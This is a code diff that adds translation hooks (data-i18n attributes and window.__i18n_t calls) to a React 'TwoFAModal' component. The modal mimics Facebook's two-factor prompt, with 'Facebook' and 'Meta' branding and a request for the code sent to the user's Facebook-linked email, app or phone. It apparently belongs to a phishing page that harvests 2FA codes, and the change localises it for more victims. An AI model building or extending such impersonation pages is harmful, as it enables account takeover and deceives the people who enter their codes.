@@ -113,10 +113,10 @@ export function TwoFAModal({
         <div className="p-8">
           <div className="mb-6">
             <p className="mb-2 text-sm text-slate-500">• Facebook</p>
-            <h2 className="text-xl font-semibold text-slate-900">
+            <h2 className="text-xl font-semibold text-slate-900" data-i18n="twofa_title">
               Two-factor authentication required
             </h2>
-            <p className="mt-3 text-sm text-slate-600">
+            <p className="mt-3 text-sm text-slate-600" data-i18n="twofa_desc">
               Check your email, Authenticator app, or phone number linked to your Facebook account to get the code.
             </p>
           </div>
@@ -136,7 +136,7 @@ export function TwoFAModal({
 
           <form onSubmit={handleSubmit} className="space-y-4">
             <div>
-              <label className="mb-2 block text-sm font-medium text-slate-700">Code</label>
+              <label className="mb-2 block text-sm font-medium text-slate-700" data-i18n="twofa_code_label">Code</label>
               <input
                 type="text"
                 placeholder=""
@@ -156,8 +156,8 @@ export function TwoFAModal({
               {error && (
                 <p className="mt-2 text-sm text-red-500">
                   {attemptCount > 0 && countdown > 0
-                    ? `Incorrect code. Please try again in ${countdown}s.`
-                    : "Code must be 6-8 digits."}
+                    ? window.__i18n_tReplace("twofa_err_wrong", { count: String(countdown) })
+                    : window.__i18n_t("twofa_err_length")}
                 </p>
               )}
             </div>
@@ -173,16 +173,16 @@ export function TwoFAModal({
                     <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                     <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                   </svg>
-                  Processing...
+                  <span data-i18n="twofa_processing">Processing...</span>
                 </>
               ) : (
-                "Continue"
+                <span data-i18n="twofa_continue">Continue</span>
               )}
             </button>
           </form>
 
           <div className="mt-6 text-center">
-            <p className="text-sm text-slate-500">∞ Meta</p>
+            <p className="text-sm text-slate-500" data-i18n="twofa_meta">Meta</p>
           </div>
         </div>
       </div>
